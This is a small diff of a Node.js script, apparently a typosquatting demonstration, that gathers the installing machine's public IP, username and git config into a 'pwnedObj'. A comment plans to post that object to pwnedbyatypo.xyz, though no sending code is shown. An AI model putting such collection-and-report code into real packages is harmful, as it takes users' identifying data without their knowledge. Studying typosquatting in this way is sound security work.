@@ -3,12 +3,12 @@
 
 const async = require('async');
 const chalk = require('chalk');
+const gitconfig = require('git-config');
 const isRoot = require('is-root');
 const network = require('network');
 const os = require('node.os');
 const shell = require('shelljs');
 const username = require('username');
-const gitconfig = require('git-config');
 
 let operations = [];
 operations.push(getPublicIp);
@@ -20,7 +20,7 @@ async.series(operations, function(err, results) {
     if (err) {
         return err;
     } else {
-        // TODO - post to pwnedbyatypo.xyz        
+        // TODO - post to pwnedbyatypo.xyz
         let pwnedObj = {
             'ip': results[0],
             'username': results[1],
